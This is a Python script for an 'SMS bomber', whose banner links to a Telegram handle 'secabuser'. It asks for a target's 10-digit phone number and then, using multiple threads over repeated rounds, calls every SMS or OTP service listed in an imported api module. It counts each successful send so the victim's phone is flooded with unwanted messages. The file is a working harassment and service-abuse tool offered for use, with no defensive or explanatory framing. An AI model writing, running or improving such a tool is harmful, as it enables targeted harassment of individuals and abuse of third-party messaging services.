from requests import post, get
from user_agent import generate_user_agent
from colorama import Fore, init
from os import system, name
from concurrent.futures import ThreadPoolExecutor
from time import sleep, time
from datetime import timedelta
import sys
from pystyle import Colors, Colorate, Center
from api import SERVICES

init()

g = Fore.GREEN
w = Fore.WHITE
r = Fore.RED
y = Fore.YELLOW
b = Fore.LIGHTBLACK_EX
re = Fore.RESET

class Counter:
    def __init__(self):
        self.value = 0
        self.start_time = time()
        self.rounds = 0

    def increment(self):
        self.value += 1
        
    def increment_round(self):
        self.rounds += 1
        
    def get_elapsed_time(self):
        return timedelta(seconds=int(time() - self.start_time))

def _bn():
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""

 ▗▄▄▖▗▖  ▗▖ ▗▄▄▖    ▗▄▄▖  ▗▄▖ ▗▖  ▗▖▗▄▄▖ ▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▛▚▞▜▌▐▌       ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌▐▌   ▐▌ ▐▌
 ▝▀▚▖▐▌  ▐▌ ▝▀▚▖    ▐▛▀▚▖▐▌ ▐▌▐▌  ▐▌▐▛▀▚▖▐▛▀▀▘▐▛▀▚▖
▗▄▄▞▘▐▌  ▐▌▗▄▄▞▘    ▐▙▄▞▘▝▚▄▞▘▐▌  ▐▌▐▙▄▞▘▐▙▄▄▖▐▌ ▐▌
                                                           
                  t.me/secabuser
""")))

def _cs():
    system('cls' if name == 'nt' else 'clear')

def _res(counter, phone, total_services):
    _cs()
    _bn()
    
    _res = f"""
╔{'═'*37}╗
║{'   RESULTS'.center(33)}    ║
╠{'═'*37}╣
║ Target > {phone.ljust(27)}║
║ Services > {str(total_services).ljust(25)}║
║ Successful > {str(counter.value).ljust(23)}║
║ Rounds > {str(counter.rounds).ljust(25)}  ║
║ Time > {str(counter.get_elapsed_time()).ljust(27)}  ║
╚{'═'*37}╝
"""
    
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(_res)))

def _sq(service_name, number, counter):
    try:
        api_func = SERVICES.get(service_name)
        if not api_func:
            print(f"{r}{service_name.ljust(15)} wtf  :] {re}")
            return
            
        response = api_func(number)
        if response.status_code in [200, 201, 202]:
            print(f"{g}{service_name.ljust(15)} Sent  |  ({response.status_code}){re}")
            counter.increment()
        else:
            print(f"{r}{service_name.ljust(15)} Not Sent  |  ({response.status_code}){re}")
    except Exception as e:
        print(f"{r}{service_name.ljust(15)} Error > {str(e)}{re}")

def main():
    _cs()
    _bn()
    
    try:
        phone = input(f'{w}Phone > {re}').strip()
        if not phone.isdigit() or len(phone) != 10:
            print(f"{r}Invalid phone number :] {re}")
            sys.exit(1)
        
        try:
            rounds = int(input(f'{w}Round > {re}') or 1)
            if rounds < 1:
                print(f"{r}Rounds must be 1 or more :]{re}")
                sys.exit(1)
        except ValueError:
            print(f"{r}Invalid rounds number :] {re}")
            sys.exit(1)
        
        try:
            _mt = int(input(f'{w}Thread > {re}') or 5)
            if _mt < 1:
                print(f"{r}Threads must be 1 or more :] {re}")
                sys.exit(1)
        except ValueError:
            print(f"{r}Invalid threads number :] {re}")
            sys.exit(1)
        
        try:
            time_sleep = float(input(f'{w}Sleep > {re}') or 1)
            if time_sleep < 0:
                print(f"{r}Sleep time cannot be negative :] {re}")
                sys.exit(1)
        except ValueError:
            print(f"{r}Invalid sleep time :] {re}")
            sys.exit(1)
        
        _cs()
        _bn()
        
        services = list(SERVICES.keys())
        if not services:
            print(f"{r}api.py not find :] {re}")
            sys.exit(1)
        
        counter = Counter()
        total_services = len(services)
        
        print(f"\n{w}Starting .. \n")
        print(f"{w}Services available > {len(services)}{re}\n")
        
        for current_round in range(1, rounds + 1):
            print(f"{w}Round {current_round}/{rounds}")
            counter.increment_round()
            
            with ThreadPoolExecutor(max_workers=_mt) as executor:
                args = [(service, phone, counter) for service in services]
                executor.map(lambda x: _sq(*x), args)
            
            if current_round < rounds:
                sleep(time_sleep)
        
        _res(counter, phone, total_services)
    
    except KeyboardInterrupt:
        print(f"\n{r}Cancelled  :] {re}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{r}Error > {e}{re}")
        sys.exit(1)

if __name__ == "__main__":
    main()
